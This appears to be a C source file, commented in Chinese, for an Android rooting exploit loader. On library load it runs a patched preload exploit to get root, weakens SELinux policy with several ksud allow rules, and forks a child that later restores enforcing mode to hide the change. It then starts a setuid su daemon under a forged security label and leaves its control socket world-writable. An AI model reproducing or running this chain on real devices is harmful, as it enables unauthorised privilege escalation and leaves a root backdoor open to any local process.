/*
 * loader.c — exploit + delayed enforce restore via detached child
 *
 * 流程:
 *   1. dlopen preload_patched.so → root (Permissive)
 *   2. fork detached child → 等 5 秒 → 恢复 enforcing
 *   3. 启动 su daemon (Permissive 下，shell:s0 context)
 *
 * 编译: make
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <stdint.h>
#include <errno.h>
#include <signal.h>
#include <sys/xattr.h>
#include <sys/stat.h>

__attribute__((constructor))
static void loader_main(void) {
    /* 步骤 1: exploit → root (Permissive) */
    void *h = dlopen("/data/local/tmp/preload_patched.so", RTLD_NOW);
    if (!h) return;

    FILE *log = fopen("/data/local/tmp/loader.log", "w");
    if (!log) log = stderr;
    fprintf(log, "exploit uid=%d\n", getuid());
    fflush(log);

    /* 步骤 1.5: 补 SELinux policy（Permissive 下执行）*/
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow shell kernel unix_stream_socket connectto read write getattr\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow shell shell_data_file sock_file read write open getattr\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow kernel self unix_stream_socket create setopt\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow kernel shell_data_file dir write add_name remove_name search\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow kernel shell_data_file sock_file create unlink write getattr\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow su kernel unix_stream_socket connectto read write getattr\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow su shell_data_file sock_file read write open getattr\" 2>/dev/null");
    system("/data/local/tmp/ksud sepolicy patch "
           "\"allow shell system_file file execute_no_trans\" 2>/dev/null");
    fprintf(log, "sepolicy patched\n");

    /* 步骤 2: fork detached child 延迟恢复 enforcing */
    signal(SIGCHLD, SIG_IGN);
    pid_t enforcer = fork();
    if (enforcer == 0) {
        setsid();
        /* 等 exploit 进程退出 + su daemon 启动 */
        sleep(8);
        /* 恢复 enforcing */
        int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
        if (fd >= 0) { write(fd, "1", 1); close(fd); }
        /* 验证 */
        fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            char c = 0; read(fd, &c, 1); close(fd);
            /* 写日志 */
            FILE *lg = fopen("/data/local/tmp/loader.log", "a");
            if (lg) { fprintf(lg, "enforcer: enforce=%c\n", c); fclose(lg); }
        }
        _exit(0);
    }
    fprintf(log, "enforcer child pid=%d (will restore enforcing in 5s)\n", enforcer);

    /* 步骤 3: 启动 su daemon (Permissive 下) */
    setxattr("/data/local/tmp/su_real", "security.selinux",
             "u:object_r:system_file:s0", 25, 0);
    chmod("/data/local/tmp/su_real", 06755);
    system("pkill -9 su_real 2>/dev/null");
    unlink("/data/local/tmp/temp_su.sock");
    usleep(200000);

    pid_t su_pid = fork();
    if (su_pid == 0) {
        setsid();
        int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
        if (fd >= 0) { write(fd, "u:r:shell:s0", 12); close(fd); }
        execl("/data/local/tmp/su_real", "su_real", "--daemon", NULL);
        _exit(1);
    }
    fprintf(log, "su daemon pid=%d\n", su_pid);

    /* 等 socket 创建后修复权限 */
    usleep(500000);
    chmod("/data/local/tmp/temp_su.sock", 0666);
    setxattr("/data/local/tmp/temp_su.sock", "security.selinux",
             "u:object_r:shell_data_file:s0", 28, 0);

    fprintf(log, "done. enforcing will restore in ~5s\n");
    fflush(log);
    if (log != stderr) fclose(log);
}
